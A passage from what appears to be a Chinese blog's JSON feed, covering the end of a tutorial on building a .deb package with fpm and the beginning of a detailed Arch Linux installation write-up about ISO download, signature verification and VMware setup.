https://mirrors.tuna.tsinghua.edu.cn/rubygems/ --remove https://rubygems.org/\n# 列出已有源\ngem sources -l\n# 应该只有镜像源一个\n</code></pre>\n<p>或者在<code>~/.gemrc</code>中将<code>https://mirrors.tuna.tsinghua.edu.cn/rubygems/</code>加到<code>sources</code>字段。<br>:::</p>\n<ol start=\"3\">\n<li>查看<code>fpm</code>是否安装，输入<code>fpm</code></li>\n</ol>\n<h3 id=\"创建包文件夹\"><a href=\"#创建包文件夹\" class=\"headerlink\" title=\"创建包文件夹\"></a>创建包文件夹</h3><ol>\n<li>创建目录<code>packpenguin/usr/bin</code>，将<code>hellopenguin</code>放进去</li>\n</ol>\n<pre><code class=\"bash\">mkdir -p packpenguin/usr/bin\nmv hellopenguin packpenguin/usr/bin\n</code></pre>\n<ol start=\"2\">\n<li>在<code>packpenguin</code>的父目录中，使用<code>fpm</code>进行打包，命令如下：</li>\n</ol>\n<pre><code class=\"bash\">fpm -s dir -t deb -n hellopenguin -v 1.0~ocf1 -C packpenguin\n</code></pre>\n<p>其中几个字段解释如下：</p>\n<ul>\n<li><code>-s</code>：使用一个目录构建</li>\n<li><code>-t</code>：生成<code>deb</code>包</li>\n<li><code>-n</code>：输出包的名字叫<code>hellopenguin</code></li>\n<li><code>-v</code>：版本号为<code>1.0~ocf1</code></li>\n<li><code>-C</code>:由<code>packpenguin</code>目录生成</li>\n</ul>\n<ol start=\"3\">\n<li>安装我们组建的包:<code>sudo dpkg -i ./hellopenguin_1.0~ocf1_amd64.deb</code></li>\n<li>输入<code>hellopenguin</code>，运行<code>hellopenguin</code>，可以看到输出了<code>Hello Penguin!</code></li>\n</ol>\n<p>:::info<br>要卸载我们安装的包，可以使用<code>dpkg --remove hellopenguin</code>命令。<br>:::</p>\n<h1 id=\"参考资料\"><a href=\"#参考资料\" class=\"headerlink\" title=\"参考资料\"></a>参考资料</h1><ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb2NzLmdvb2dsZS5jb20vcHJlc2VudGF0aW9uL2QvMVJNTlBSSE5vaDRhNUtXd1hZOGZCV0o0OW5CYWZ4Ym80Zy1PdlNaWjg1VjgvZWRpdCNzbGlkZT1pZC5nNTM2NGNlYzI4Y18wXzEx\">Packaging</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kZWNhbC5vY2YuYmVya2VsZXkuZWR1L2FyY2hpdmVzLzIwMjItc3ByaW5nL2xhYnMvYTIvI2dyYWRpbmctbm90ZQ==\">Advanced Lab 2 - Packages and Packaging and Troubleshooting</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb2NzLmdvb2dsZS5jb20vcHJlc2VudGF0aW9uL2QvMVVKSE83Zlhvay02Uk43REFKNVNQVHFjQ1hpUlNSOGhwR1p4OU9RTW5NT1UvZWRpdCNzbGlkZT1pZC5w\">Distros, Packaging, and Compiling</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kZWNhbC5vY2YuYmVya2VsZXkuZWR1L2FyY2hpdmVzLzIwMjItc3ByaW5nL2xhYnMvYjQvI3doYXQtaXMtYS1kaXN0cmlidXRpb24=\">Beginner Lab 4 - Debian, packages, compiling software</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2pvcmRhbnNpc3NlbC9mcG0vd2lraQ==\">FPM 文档</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly90bGRyLnNoLw==\">TLDR 页面</span></li>\n</ul>\n",
            "tags": [
                "Linux",
                "操作系统",
                "notes",
                "Debian",
                "包管理"
            ]
        },
        {
            "id": "https://salvely.github.io/blog/2023/10/12/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/Arch/%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/",
            "url": "https://salvely.github.io/blog/2023/10/12/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/Arch/%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/",
            "title": "Arch Linux安装实录&知识讲解&踩坑分析（超详细！）",
            "date_published": "2023-10-12T05:50:44.000Z",
            "content_html": "<p>:::danger<br>此坑还没填完，暂时只添加了安装部分（装完发现 Arch wiki 实在是已经写得很详细了），还有很多的知识还没有完全弄清楚和补充。<br>等我学习完<code>计算机组成原理</code>，<code>操作系统</code>和<code>计算机网络</code>后会再来填坑。<br>:::</p>\n<p>:::info<br>本文安装过程基本按照 Arch Linux 安装文档，附带了额外的相关知识。其中可能伴有踩坑，但是也是一种经验啦！:smile:<br>如发现本文某些地方有误，请在评论区评论，我看到的话会改过来哒！<br>:::</p>\n<h1 id=\"写作起因\"><a href=\"#写作起因\" class=\"headerlink\" title=\"写作起因\"></a>写作起因</h1><p>Arch Linux 的安装过程涉及较多的操作系统知识，而不仅仅是像 Ubuntu&#x2F;Debian 那样提供 GUI 中的几个选项供你选择。此外，Arch Linux 的文档较为详细（Arch wiki 简直是棒极了！）。<br>因此，本教程不只是演示本人的安装&amp;踩坑过程，还附带许多的相关文档带读、踩坑原因分析等。</p>\n<h1 id=\"本文适合哪些人\"><a href=\"#本文适合哪些人\" class=\"headerlink\" title=\"本文适合哪些人\"></a>本文适合哪些人</h1><ol>\n<li>热爱倒腾的</li>\n<li>不怕踩坑的</li>\n<li>想要通过 Arch Linux 安装过程递归学习其他知识的</li>\n</ol>\n<h1 id=\"对于其他同学\"><a href=\"#对于其他同学\" class=\"headerlink\" title=\"对于其他同学\"></a>对于其他同学</h1><p>若您仅需要高效的安装 Arch Linux，而不希望看相关知识及其他无关的踩坑过程的，可以：</p>\n<ol>\n<li>参考其他博主的奶妈式教程</li>\n</ol>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC81OTYyMjc1MjQ=\">Arch Linux 详细安装教程，萌新再也不怕了！「2023.09」</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9hcmNoLmljZWt5bGluLm9ubGluZS8=\">archlinux 简明指南 包含安装、配置、维护等，帮助新手快速上手</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9hcmNobGludXhzdHVkaW8uZ2l0aHViLmlvL0FyY2hMaW51eFR1dG9yaWFsLyMv\">Arch Linux 安装使用教程 - ArchTutorial - Arch Linux Studio</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2ttaW5kaS9qaWZmeWJveC1hcmNobGludXgtdHV0b3JpYWw=\">Github 教程 1</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2RzMTk5OTE5OTkvQXJjaExpbnV4LUluc3RhbGwtVHV0b3JpYWw=\">Github 教程 2</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC80NzgwNzU1Mzg=\">2022 年 12 月最新安装 Archlinux 一次过的教程</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC81MTM4NTkyMzY=\">2022.5 archlinux 详细安装过程</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubWl2bS5jbi9hcmNobGludXgtaW5zdGFsbGF0aW9uLWd1aWRlLXNpbXBsZQ==\">ArchLinux 安装指南（新手向）</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC80MzM5MjAwNzk=\">Archlinux 安装教程超详细（2021.11.15</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYmlsaWJpbGkuY29tL3JlYWQvY3YyMDc1MzA1Mi8=\">Arch Linux 完全安装教程 2023.10</span></li>\n</ul>\n<ol start=\"2\">\n<li>archinstall 工具</li>\n</ol>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9saW51eC5jbi9hcnRpY2xlLTE0NDQ0LTEuaHRtbA==\">用 archinstall 自动化脚本安装 Arch Linux</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2FyY2hsaW51eC9hcmNoaW5zdGFsbA==\">archinstall github 链接</span></li>\n</ul>\n<ol start=\"3\">\n<li>一些图形化界面安装工具</li>\n</ol>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3Nwb29reWtpZG1tL3plbl9pbnN0YWxsZXI=\">Zen installer</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2FyY2gtbGludXgtZ3VpL2FsZy1yZWxlYXNlcw==\">archlinuxgui</span></li>\n</ul>\n<ol start=\"4\">\n<li>Netboot 网络安装</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3Rlbmd0ZW5nc25ha2UvQXJjaC1saW51eC1pbnN0YWxsLXR1dG9yaWFs\">Github 上提供的脚本（按照里面的命令一个个输入）</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93aWtpLmFyY2hsaW51eC5vcmcvdGl0bGUvQ2F0ZWdvcnk6SW5zdGFsbGF0aW9uX3Byb2Nlc3M=\">其他安装方式</span></li>\n<li>要在一个 Ubuntu 虚拟机上安装 Arch 虚拟机（嵌套虚拟机），请看<span class=\"exturl\" data-url=\"aHR0cHM6Ly9kZWNhbC5vY2YuYmVya2VsZXkuZWR1L2FyY2hpdmVzLzIwMjItc3ByaW5nL2xhYnMvYTMv\">这里</span></li>\n</ol>\n<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>在使用 Arch 前看了 UCB System Admin Decal 的 Linux Pre-install and Install 一节，其中的实验是在 Ubuntu 虚拟机上安装 Arch。Arch 的安装涉及到自己进行分区，对系统进行加密和解密等，我觉得非常有趣，对于操作系统本身也是一个探索的过程。因此决定挑战自己跟着官方文档进行安装。<br>以前每次安装 Linux 虚拟机，包括 Ubuntu 和 Debian，都是跟着一些博主自己写的奶妈式手把手安装教程一步步的装。每次都能安装成功，但是总是感觉少了一些<code>【探索的乐趣】</code>:laughing:。<br>今天我就要跟着 Arch Linux 的官方文档一步步装，感受一把极致的安装酸爽体验！<br>+++ 如果你也想体验自己安装 Arch，或者是想成为 Arch 开发者，下面内容可能对你有帮助：</p>\n<ol>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93aWtpLmFyY2hsaW51eC5vcmcvdGl0bGUvSW5zdGFsbGF0aW9uX2d1aWRlI0FjcXVpcmVfYW5faW5zdGFsbGF0aW9uX2ltYWdl\">Arch Linux 官方安装文档</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRsYWIuYXJjaGxpbnV4Lm9yZy9hcmNobGludXgvYXJjaGlzby8tL2lzc3Vlcw==\">Issue tracker</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9saXN0cy5hcmNobGludXgub3JnL21haWxtYW4zL2xpc3RzL2FyY2gtcmVsZW5nLmxpc3RzLmFyY2hsaW51eC5vcmcv\">Mailing List</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93aWtpLmFyY2hsaW51eGNuLm9yZy93aWtpLyVFNSVCOCVCOCVFOCVBNyU4MSVFOSU5NyVBRSVFOSVBMiU5OA==\">常见问题及解答</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93aWtpLmFyY2hsaW51eGNuLm9yZy93aWtpL0hlbHA6JUU5JTk4JTg1JUU4JUFGJUJC\">帮助</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93aWtpLmFyY2hsaW51eGNuLm9yZy93aWtpL1Byb2plY3Q6JUU1JTg1JUIzJUU0JUJBJThF\">贡献项目</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93aWtpLmFyY2hsaW51eGNuLm9yZy93aWtpL01hbl9wYWdl\">帮助手册</span><br>+++</li>\n</ol>\n<h1 id=\"过程简介\"><a href=\"#过程简介\" class=\"headerlink\" title=\"过程简介\"></a>过程简介</h1><p>安装过程涉及到的步骤包含：</p>\n<ol>\n<li>UEFI 模式启动（或 BIOS，但是分区会不一样，需要注意）</li>\n<li>设置键盘模式</li>\n<li>检查网络连接</li>\n<li>更新系统时钟</li>\n<li>创建磁盘分区</li>\n<li>初始化分区中的文件系统（<code>/</code>文件系统可选是否加密）</li>\n<li>挂载文件系统</li>\n<li>利用<code>pacstrap</code>安装必要的包：linux 内核，<code>initrd</code>、<code>init system</code>、<code>pacman</code>\\、<code>base</code>等等</li>\n<li>利用<code>genfstab</code>生成<code>/etc/fstab</code>（文件系统表）</li>\n<li><code>arch-chroot</code>进入<code>/mnt</code>目录</li>\n<li>通过修改<code>/etc/hostname</code>修改主机名<br>+++ boot 启动原理<blockquote>\n<p>图源自 UCB System Admin Decal(<span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb2NzLmdvb2dsZS5jb20vcHJlc2VudGF0aW9uL2QvMW9MdHNqc0VJc3ZDaE9JMzFfNVlZRmhJTGZ6R2x5eDdIazlEc0wxTnYtbWMvZWRpdD9wbGk9MSNzbGlkZT1pZC5nOWI0MTRkZGEwNF8wXzE1OA==\">https://docs.google.com/presentation/d/1oLtsjsEIsvChOI31_5YYFhILfzGlyx7Hk9DsL1Nv-mc/edit?pli=1#slide=id.g9b414dda04_0_158</span>)</p>\n</blockquote>\n</li>\n</ol>\n<p><img data-src=\"/blog/2023/10/12/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/Arch/%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/boot.png\" alt=\"boot启动原理\"><br>+++</p>\n<h1 id=\"获取安装镜像（后缀为-iso）\"><a href=\"#获取安装镜像（后缀为-iso）\" class=\"headerlink\" title=\"获取安装镜像（后缀为.iso）\"></a>获取安装镜像（后缀为.iso）</h1><p>看了一下下载界面，最顶部写了当前发行版的信息，下面是对于几种不同用户的安装方式以及校验和，最后是所有的 Arch 镜像源集合。</p>\n<h2 id=\"发行版信息\"><a href=\"#发行版信息\" class=\"headerlink\" title=\"发行版信息\"></a>发行版信息</h2><p>当前发布版本: 2023.09.01<br>内核版本: 6.4.12<br>ISO 镜像文件大小: 804.3 MB</p>\n<h2 id=\"几种下载方式\"><a href=\"#几种下载方式\" class=\"headerlink\" title=\"几种下载方式\"></a>几种下载方式</h2><h3 id=\"对于已经是-Arch-用户的人\"><a href=\"#对于已经是-Arch-用户的人\" class=\"headerlink\" title=\"对于已经是 Arch 用户的人\"></a>对于已经是 Arch 用户的人</h3><ol>\n<li>通过命令<code>pacman -Syu</code>更新</li>\n<li>通过<span class=\"exturl\" data-url=\"aHR0cHM6Ly9hcmNobGludXgub3JnL21pcnJvcmxpc3Qv\">这里</span>更新镜像源</li>\n</ol>\n<h3 id=\"种子链接下载（官方推荐）\"><a href=\"#种子链接下载（官方推荐）\" class=\"headerlink\" title=\"种子链接下载（官方推荐）\"></a>种子链接下载（官方推荐）</h3><p>对于这种资源，可以使用<code>百度网盘</code>或者<code>迅雷</code>下载（和下载电影相同），下载格式为.torrent，该种子链接需要上传到百度网盘&#x2F;迅雷，然后将其中的 iso 镜像文件下载到本地目录中。</p>\n<h3 id=\"Netboot\"><a href=\"#Netboot\" class=\"headerlink\" title=\"Netboot\"></a>Netboot</h3><p>安装时需要联网，最新版本会自动推送，可用于在系统启动时即时下载最新的 Arch Linux 版本。</p>\n<blockquote>\n<p>Netboot 使用定制的 <code>iPXE</code> 版本。 实时系统的 Linux 内核、<code>initramfs</code> 和 <code>squashfs 文件</code>是从 Arch Linux 镜像下载的。 所有下载文件的完整性都使用<code>加密签名</code>进行验证。</p>\n</blockquote>\n<p>这其中有几个问题：</p>\n<ol>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9pcHhlLm9yZy9zdGFydA==\">iPXE</span>是啥？<strong>一种开源的网络启动固件</strong><br>其官方文档中的描述如下：<blockquote>\n<p>iPXE 是领先的开源网络引导固件。它提供了完整的 PXE 实现，并通过其他功能进行了增强，例如：</p>\n<ul>\n<li>通过 HTTP 从 Web 服务器启动</li>\n<li>从 iSCSI SAN 引导</li>\n<li>通过 FCoE 从光纤通道 SAN 启动</li>\n<li>从 AoE SAN 引导</li>\n<li>从无线网络引导</li>\n<li>从广域网引导</li>\n<li>从 Infiniband 网络引导</li>\n<li>使用脚本控制引导过程</li>\n</ul>\n</blockquote>\n</li>\n</ol>\n<p>由此可以看出，iPXE 是一种基于网络进行系统启动的固件。它的启动需要依附于计算机网络的各种协议。在 Arch Linux 文档中也指明，使用 Netboot 安装需要满足以下两点要求：</p>\n<ul>\n<li>具有 DHCP 自配置的网络</li>\n<li>能够运行系统的足够存储</li>\n</ul>\n<p>而它的具体实现是基于<code>PXE</code>协议。<br>基于递归学习的理念，我又查了查<span class=\"exturl\" data-url=\"aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvJUU5JUEyJTg0JUU1JTkwJUFGJUU1JThBJUE4JUU2JTg5JUE3JUU4JUExJThDJUU3JThFJUFGJUU1JUEyJTgzIw==\">PXE</span>。。。<br>其基本概念如下：</p>\n<blockquote>\n<p>预启动执行环境（Preboot eXecution Environment，PXE，也被称为预执行环境）提供了一种使用网络接口（Network Interface）启动计算机的机制。这种机制让计算机的启动可以不依赖本地数据存储设备（如硬盘）或本地已安装的操作系统。<br>PXE 当初是作为 Intel 的有线管理体系的一部分，Intel 和 Systemsoft 于 1999 年 9 月 20 日公布其规格（版本 2.1）[1]。通过使用像网际协议（IP）、用户数据报协议（UDP）、动态主机设定协定（DHCP）、BOOTP、小型文件传输协议（TFTP）等几种网络协议和全局唯一标识符（GUID）、通用网络驱动接口（UNDI）、通用唯一识别码（UUID）的概念并通过对客户机（通过 PXE 自检的电脑）固件扩展预设的 API 来实现目的。<br>PXE 客户机（client）这个术语是指机器在 PXE 启动过程中的角色。</p>\n</blockquote>\n<p>其基本的运行机制是：</p>\n<blockquote>\n<p>客户机的固件（如网卡的 PXE 固件）通过 DHCP 协议找到可用的 PXE 启动服务器。在找到可用的 PXE 启动服务器后，固件会向合适的启动服务器询问网络启动程序（NBP，Network Boot Program）的路径，并且通过 TFTP 协议将网络启动程序下载到电脑的内存中，最后执行它[2]。</p>\n</blockquote>\n<p>由<code>PXE</code>机制又衍生出了无盘系统，其利用网络服务器下载启动系统的镜像，而不是本地硬盘。<code>PXE</code>的协议规范在<span class=\"exturl\" data-url=\"aHR0cHM6Ly93ZWIuYXJjaGl2ZS5vcmcvd2ViLzIwMTMxMTAyMDAzMTQxL2h0dHA6Ly9kb3dubG9hZC5pbnRlbC5jb20vZGVzaWduL2FyY2hpdmVzL3dmbS9kb3dubG9hZHMvcHhlc3BlYy5wZGY=\">intel 的这篇文档中</span>可以查到。而 PXE 的两个实现，一个为<code>iPXE</code>，另一个则是<code>gPXE</code>。<code>gPXE</code>目前已经停止开发，取而代之的是<code>iPXE</code>。<br>对于<code>iPXE</code>和<code>gPXE</code>更详细的介绍，可以参考<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmhjbC5tb2UvYXJjaGl2ZXMvMjE3Nw==\">这篇博文</span></p>\n<ol start=\"2\">\n<li><p><code>initramfs文件</code>和<code>squashfs文件</code>做什么用？<br>TODO</p>\n</li>\n<li><p>为什么<code>Arch Linux</code>在下载过程中需要使用加密签名对镜像完整性进行验证？<br>TODO</p>\n</li>\n</ol>\n<h3 id=\"Vagrant-images-docker-images\"><a href=\"#Vagrant-images-docker-images\" class=\"headerlink\" title=\"Vagrant images &amp; docker images\"></a>Vagrant images &amp; docker images</h3><p>TODO</p>\n<h3 id=\"VM-image\"><a href=\"#VM-image\" class=\"headerlink\" title=\"VM image\"></a>VM image</h3><p>archlinux 虚拟机可从<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRsYWIuYXJjaGxpbnV4Lm9yZy9hcmNobGludXgvYXJjaC1ib3hlcy8tL3BhY2thZ2Vz\">这里</span>下载，使用手册<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRsYWIuYXJjaGxpbnV4Lm9yZy9hcmNobGludXgvYXJjaC1ib3hlcw==\">在此</span>。</p>\n<h3 id=\"HTTP-下载（最常用）\"><a href=\"#HTTP-下载（最常用）\" class=\"headerlink\" title=\"HTTP 下载（最常用）\"></a>HTTP 下载（最常用）</h3><p>从后文中的镜像源中下载镜像。需要注意的是，我们需要保证下载的镜像的校验和，和同一目录<code>sha256sums.txt</code>及<code>b2sums.txt</code>文件中的校验和匹配。<br>下载签名：<code>sq wkd get pierre@archlinux.org -o release-key.pgp</code><br>验证：<code>sq verify --signer-file release-key.pgp --detached archlinux-2023.09.01-x86_64.iso.sig archlinux-2023.09.01-x86_64.iso</code><br>:::info<br><code>sq</code>命令需要使用<code>scoop</code>进行安装，如果是 windows 用户，会比较麻烦，详细解决办法见后文<br>:::</p>\n<h2 id=\"校验和\"><a href=\"#校验和\" class=\"headerlink\" title=\"校验和\"></a>校验和</h2><p>最新版本的校验和下载详见官网。在镜像源网站上也可以看到<code>sha256sums.txt</code>和<code>b2sums.txt</code><br><img data-src=\"/blog/2023/10/12/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/Arch/%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/tsinghua_mirror.png\" alt=\"清华大学镜像站\">。下载镜像后我们需要利用它与我们下载到的镜像的校验和进行比对(主要是用于比对，这两个文件可下载也可不下载，在镜像站上也能打开，只要我们下载到的镜像的校验和文件中版本对应的那行的校验和匹配就行了)。</p>\n<h2 id=\"方法一\"><a href=\"#方法一\" class=\"headerlink\" title=\"方法一\"></a>方法一</h2><ol>\n<li>在<span class=\"exturl\" data-url=\"aHR0cHM6Ly9hcmNobGludXgub3JnL2Rvd25sb2FkLw==\">Download 界面</span>选择推荐的 BitTorrent Download:<br><img data-src=\"/blog/2023/10/12/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/Arch/%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/download.png\" alt=\"下载界面\"></li>\n<li>下载到本地电脑的 Downloads 文件夹中，其后缀名为<code>.torrent</code></li>\n<li>打开百度网盘，在其中上传该文件</li>\n<li>上传后双击该文件，点击开始下载到网盘，等待下载完成（有点慢哈！）</li>\n<li>下载到网盘后，将<code>iso镜像文件</code>下载到在自选的本地目录中<br>:::info<br>由于这种方式下载过慢，笔者建议使用方法二，即通过开源镜像站进行下载。<br>:::</li>\n</ol>\n<h2 id=\"方法二\"><a href=\"#方法二\" class=\"headerlink\" title=\"方法二\"></a>方法二</h2><ol>\n<li>在<span class=\"exturl\" data-url=\"aHR0cHM6Ly9hcmNobGludXgub3JnL2Rvd25sb2FkLw==\">Download 界面</span>下翻，找到中国的镜像站列表:<br><img data-src=\"/blog/2023/10/12/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/Arch/%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/mirrors.png\" alt=\"中国镜像站列表\"></li>\n<li>在其中选择<code>tuna.tsinghua.edu.cn</code>，即清华大学镜像站（我每次都用他们的镜像，速度不错）<br><img data-src=\"/blog/2023/10/12/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/Arch/%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/tsinghua_mirror.png\" alt=\"清华大学镜像站\"></li>\n<li>选择<code>archlinux-2023.09.01-x86_64.iso</code>下载</li>\n<li>将<code>.iso</code>文件保存到我们想要虚拟机保存的目录中</li>\n</ol>\n<h1 id=\"获取GnuPG签名\"><a href=\"#获取GnuPG签名\" class=\"headerlink\" title=\"获取GnuPG签名\"></a>获取<span class=\"exturl\" data-url=\"aHR0cHM6Ly93aWtpLmFyY2hsaW51eGNuLm9yZy93aWtpL0dudVBH\">GnuPG</span>签名</h1><blockquote>\n<p>GnuPG 是什么？<br>GnuPG 是完整实现了 RFC4880（即 PGP）所定义的 OpenPGP 标准的自由软件。GnuPG 可以加密和签名你的数据和通讯信息，包含一个通用的密钥管理系统以及用于各种公钥目录的访问模块。GnuPG，简称 GPG，是一个易于与其它程序整合的命令行工具，拥有很多前端程序和函数库。GnuPG 还支持 S&#x2F;MIME 和 Secure Shell (ssh)。</p>\n</blockquote>\n<p>从上述清华大学镜像站，可获取 iso 版本对应的 PGP 签名<code>archlinux-2023.09.01-x86_64.iso.sig`` ![清华大学镜像站](tsinghua_mirror.png) 在本次安装中，我使用的是</code>Git Bash<code>，其中装有GPG，</code>cmd<code>和</code>powershell&#96;中也装有 gpg，可选择一个终端进行后续操作。</p>\n<h1 id=\"验证签名\"><a href=\"#验证签名\" class=\"headerlink\" title=\"验证签名\"></a>验证签名</h1><p>为避免因 HTTP 连接下载镜像时遭到拦截，获取到恶意镜像，我们需要利用 PGP 签名对镜像进行验证。<br>通过以下命令验证:</p>\n<pre><code class=\"bash\">gpg --keyserver-options auto-key-retrieve --verify archlinux-version-x86_64.iso.sig\n</code></pre>\n<p>其中<code>version</code>替换成你所下载的版本号，如<code>2023.09.01</code>。我的显示结果是：</p>\n<pre><code class=\"bash\">legion@DESKTOP-ROOSFVQ MINGW64 /e/VMs/Arch\n$ gpg --keyserver-options auto-key-retrieve --verify archlinux-2023.09.01-x86_64.iso.sig\ngpg: assuming signed data in &#39;archlinux-2023.09.01-x86_64.iso&#39;\ngpg: Signature made 2023年09月 1日 18:48:49\ngpg:                using EDDSA key 3E80CA1A8B89F69CBA57D98A76A5EF9054449A5C\ngpg:                issuer &quot;pierre@archlinux.org&quot;\ngpg: Good signature from &quot;Pierre Schmitz &lt;pierre@archlinux.org&gt;&quot; [unknown]\ngpg: WARNING: This key is not certified with a trusted signature!\ngpg:          There is no indication that the signature belongs to the owner.\nPrimary key fingerprint: 3E80 CA1A 8B89 F69C BA57  D98A 76A5 EF90 5444 9A5C\n</code></pre>\n<p>若从镜像站下载，则会显示<code>fingerprint</code>，我们需要打开<span class=\"exturl\" data-url=\"aHR0cHM6Ly9rZXlzZXJ2ZXIudWJ1bnR1LmNvbS9wa3MvbG9va3VwP29wPXZpbmRleCZmaW5nZXJwcmludD1vbiZleGFjdD1vbiZzZWFyY2g9MHgzRTgwQ0ExQThCODlGNjlDQkE1N0Q5OEE3NkE1RUY5MDU0NDQ5QTVD\">fingerprint 合集</span>,确保我们所获得的镜像的<code>fingerprint</code>和该网站上的 fingerprint 吻合。（确保公钥的指纹等于其中一位签署了 ISO 文件 Arch Linux 开发者的指纹）</p>\n<h1 id=\"准备安装介质\"><a href=\"#准备安装介质\" class=\"headerlink\" title=\"准备安装介质\"></a>准备安装介质</h1><p>安装镜像包括：U 盘，光盘，和带有 PXE 的网络安装镜像。此处我是用 VMWare 虚拟机进行安装。</p>\n<h1 id=\"VMWare-新建虚拟机\"><a href=\"#VMWare-新建虚拟机\" class=\"headerlink\" title=\"VMWare 新建虚拟机\"></a>VMWare 新建虚拟机</h1><p>依次选择：</p>\n<ol>\n<li>自定义（高级）</li>\n<li>硬件兼容性</li>\n<li>稍后安装操作系统</li>\n<li>本内核版本为 6.4.12，因 VMware 中没有 Arch，因此我选择<code>其他 Linux 5.x 内核 64位</code></li>\n<li>选择安装目录（自定）</li>\n<li>处理器配置、<del>内存大小分配</del>均选择默认（注意：内存大小选择 2G，768MB 完全不够)</li>\n<li>使用网络地址转换（NAT）</li>\n<li>SCSI 控制器:LSI Logic（L）</li>\n<li>虚拟磁盘类型：SCSI（S）</li>\n<li>创建新虚拟磁盘</li>\n<li>最大磁盘大小默认，将虚拟磁盘拆分成多个文件</li>\n<li>磁盘文件名默认</li>\n<li>自定义硬件-&gt;新 CD&#x2F;DVD-&gt;使用 ISO 映像文件-&gt;选择我们下载的 iso 文件-&gt;关闭</li>\n<li>完成</li>\n<li>你可以自行决定 BIOS 或 UEFI 模式启动（我选择 UEFI，但是应该影响不大）</li>\n<li>点击开启此虚拟机<br>:::info<br>Ready for the journey? Let’s go!<br>:::</li>\n</ol>\n<h1 id=\"进入安装程序\"><a href=\"#进入安装程序\" class=\"headerlink\" title=\"进入安装程序\"></a>进入安装程序</h1><ol>\n<li>默认第一项，等待一会儿，随后进入命令行模式</li>\n</ol>\n<h1 id=\"一号坑：VMware-默认分配内存-768MB-过小，需要-2G\"><a href=\"#一号坑：VMware-默认分配内存-768MB-过小，需要-2G\" class=\"headerlink\" title=\"一号坑：VMware 默认分配内存 768MB 过小，需要 2G\"></a>一号坑：VMware 默认分配内存 768MB 过小，需要 2G</h1><p>开局遇雷：怎么回事？<br><img data-src=\"/blog/2023/10/12/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/Arch/%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/command.png\" alt=\"命令行模式开启\"><br>:::info<br>参考了<span class=\"exturl\" 